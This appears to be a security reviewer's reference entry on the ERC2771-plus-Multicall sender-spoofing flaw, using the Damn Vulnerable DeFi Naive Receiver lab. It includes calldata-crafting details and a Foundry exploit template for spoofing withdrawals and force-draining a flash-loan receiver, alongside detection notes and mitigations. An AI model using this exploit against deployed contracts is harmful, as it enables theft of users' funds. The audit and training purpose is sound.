# Attack Pattern: ERC2771 + Multicall Sender Confusion

**Family:** Meta-tx / ERC2771 + Multicall composition
**Reference example:** Damn Vulnerable DeFi v4 — Naive Receiver
**Severity when present:** Critical (complete fund drain possible)
**Detection by Slither/Aderyn:** NO (confirmed — both miss the composition)
**Solodit tags:** erc2771, multicall, meta-tx, sender-spoofing, delegatecall

---

## Trigger condition

A contract that BOTH:
1. Implements ERC2771 _msgSender() override (checks if msg.sender == trustedForwarder,
   if yes returns last20(msg.data) as the authenticated caller)
2. Uses Multicall (a pattern that iterates over calldata array, delegatecalling
   to address(this) for each entry)

The forwarder pattern and multicall are each deployed independently (OZ Multicall,
OZ ERC2771, custom variants). The vulnerability is in their composition.

---

## Vulnerability mechanism

### ERC2771 normal flow (no Multicall):
```
player -> forwarder.execute(req, sig)
  payload = abi.encodePacked(req.data, bytes20(req.from))
  call(pool, payload)
  pool receives: msg.sender = forwarder, msg.data = req.data || bytes20(player)
  pool._msgSender(): msg.sender == trustedForwarder -> return last20(msg.data) = player
```

### ERC2771 + Multicall composition (BROKEN):
```
player -> forwarder.execute(req{ data = multicall(data[0..N]) })
  pool.multicall(data[0..N]) receives: msg.sender = forwarder,
                                        msg.data = multicall_calldata || bytes20(player)
  for each data[i]:
    Address.functionDelegateCall(pool, data[i])
    inner delegatecall receives:
      msg.sender = forwarder  (PRESERVED -- delegatecall keeps msg.sender)
      msg.data   = data[i]    (REPLACED -- inner calldata, NOT outer multicall_calldata)
    pool._msgSender():
      msg.sender == trustedForwarder : TRUE  (forwarder is preserved)
      last20(msg.data)               = last20(data[i]) <-- ATTACKER CONTROLLED
```

The forwarder's authentication (appending bytes20(from) to the outer calldata)
does NOT propagate through delegatecall boundaries. The inner msg.data is the
attacker's raw inner calldata.

---

## Calldata crafting

For a function `withdraw(uint256 amount, address receiver)`:

```
Crafted calldata = abi.encodePacked(
    bytes4(keccak256("withdraw(uint256,address)")),   // [0..4)  selector
    abi.encode(uint256(amount)),                       // [4..36) amount
    abi.encode(address(recovery)),                     // [36..68) receiver arg
    bytes20(target_address_to_spoof)                   // [68..88) _msgSender() tail
)
Total: 88 bytes
```

ABI decoder behavior for static-type functions:
- Reads selector + 64 bytes for the two declared params
- bytes[68..88] are extra trailing bytes -- silently ignored
- amount = decoded correctly from [4..36)
- receiver = decoded correctly from [36..68)
- _msgSender() = target_address_to_spoof from [68..88)

Result: the ABI decoder sees the function call the attacker intended; _msgSender()
returns the address the attacker chose. Two independent reads of the same calldata,
both returning the attacker's intended values.

---

## Forced flashloan drain (companion attack)

When present alongside ERC3156 FlashLoanReceiver:

```
pool.flashLoan(address(receiver), token, 0, "")
```

If the receiver's onFlashLoan() does NOT validate the `initiator` parameter
(unnamed parameter, or explicit ignore), any caller can force the receiver to
pay a fee without receiving any principal. amount=0 means no transfer to
the receiver; the fee is drawn entirely from the receiver's own balance.

Signature of a vulnerable receiver:
```solidity
function onFlashLoan(address /* initiator */, address token, uint256 amount,
                     uint256 fee, bytes calldata) external returns (bytes32) {
    // initiator not checked
    uint256 amountToBeRepaid = amount + fee;
    IERC20(token).approve(address(pool), amountToBeRepaid);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

Zero capital required. One call per fee unit. 10 calls drain a receiver with
10e18 balance at 1e18/call. Direct call to pool.multicall([flashLoan x10])
works without the forwarder (flashLoan does not call _msgSender()).

---

## Detection

**Static tools (Slither, Aderyn): NO signal on the core vulnerability.**

Observed behaviors:
- Slither: tags the contract with "Delegatecall" feature; does not model
  interaction with _msgSender()
- Aderyn H-4: flags delegatecall as "arbitrary address" concern (WRONG -- it
  delegates to address(this))
- Aderyn L-7: flags the `20` in `msg.data.length >= 20` as a "magic number"
  style issue (sees the code, misses the security meaning)
- Neither tool models how delegatecall changes msg.data

**Manual detection signals:**
1. Contract imports both ERC2771 (or has isTrustedForwarder / _msgSender()) AND
   inherits Multicall (or has a function delegatecalling to address(this))
2. Forwarder appends bytes20(from) using abi.encodePacked (not abi.encode)
3. _msgSender() reads last20(msg.data) without checking depth/context

**Time budget**: do NOT spend >5 min on static sweep for ERC2771 + Multicall
targets. Static tools provide zero actionable signal. Invest all time in
hypothesis generation (Phase 3).

---

## PoC template

```solidity
// Phase 1: Force drain receiver (direct, no forwarder needed)
bytes[] memory flashCalls = new bytes[](10);
for (uint256 i = 0; i < 10; i++) {
    flashCalls[i] = abi.encodeWithSelector(
        NaiveReceiverPool.flashLoan.selector,
        address(receiver), address(weth), uint256(0), bytes("")
    );
}
// Option A: direct (cheaper, no forwarder overhead):
pool.multicall(flashCalls);
// Option B: via forwarder (also works):
// forwarder.execute(req{ data = multicall(flashCalls) })

// Phase 2: Spoof _msgSender() to drain deposits[target]
bytes memory spoofedWithdraw = abi.encodePacked(
    NaiveReceiverPool.withdraw.selector,
    abi.encode(uint256(drainAmount)),
    abi.encode(address(recovery)),
    bytes20(targetDepositor)          // last20 -- _msgSender() reads this
);
bytes[] memory withdrawBatch = new bytes[](1);
withdrawBatch[0] = spoofedWithdraw;

BasicForwarder.Request memory req = BasicForwarder.Request({
    from:     player,
    target:   address(pool),
    value:    0,
    gas:      1_000_000,
    nonce:    forwarder.nonces(player),
    data:     abi.encodeWithSelector(pool.multicall.selector, withdrawBatch),
    deadline: block.timestamp + 1 days
});

bytes32 digest = keccak256(abi.encodePacked(
    "\x19\x01",
    forwarder.domainSeparator(),
    forwarder.getDataHash(req)
));
(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
bool success = forwarder.execute(req, abi.encodePacked(r, s, v));
assertTrue(success, "forwarder.execute returned false");
```

---

## Reference

- Damn Vulnerable DeFi v4 — Naive Receiver. Every assumption verified empirically
  with a Foundry PoC (~410k gas per execution).

---

## Mitigations (for reference when reviewing protocols)

1. Do not combine ERC2771 + Multicall. If both are needed, use a version of
   Multicall that is aware of the ERC2771 forwarder context (e.g., passes
   the authenticated sender through each inner call).
2. In _msgSender(): check both msg.sender == trustedForwarder AND that the call
   did not enter via a delegatecall that replaces msg.data.
3. In FlashLoanReceiver: require(initiator == authorizedInitiator) in onFlashLoan().
4. In pool: restrict flashLoan() to whitelisted initiators, or require receiver
   to opt-in to being the flash loan target.

## Defensive reinforcement — checklist for a SAFE periphery/router

This extends the family to router/periphery drains (multicall + permit + callbacks). A
"positive" reference (taken from an audited periphery that satisfies all 4 pieces after fixing a
real router drain), used to detect which one is MISSING in the next router/periphery:
- **Stateless router: 0 funds between txs.** Every flow ends with `balance==0`; a partial fill of
  a hop reverts (it leaves no stranded tokens). If the router can retain funds → `sweepToken`/`refundETH`
  (arbitrary recipient/caller) lets **anyone** steal them. **Trace the router's balance at the end of every route.**
- **`msg.value` = 0 across the whole periphery.** The multicall is `payable`+delegatecall (the classic
  ETH double-spend vector), BUT if no path reads `msg.value` and all of them use `address(this).balance`,
  two swaps in one multicall cannot spend the same wei. **`grep msg.value` in the periphery: if it shows up
  in a payment/value path → double spend.**
- **Doubly authenticated callback:** `requireCaller(msg.sender == transient-context)` **AND**
  `FACTORY.isPool(msg.sender)`. A single check (isPool alone, or context alone) is usually the hole.
- **payer ≡ initiator.** The callback's payer comes from the transient context, set to `msg.sender` on
  entry; if an entrypoint can set `payer = victim` (whose approval the router holds) → drain.
  **Verify that no set-site accepts a payer other than msg.sender.**
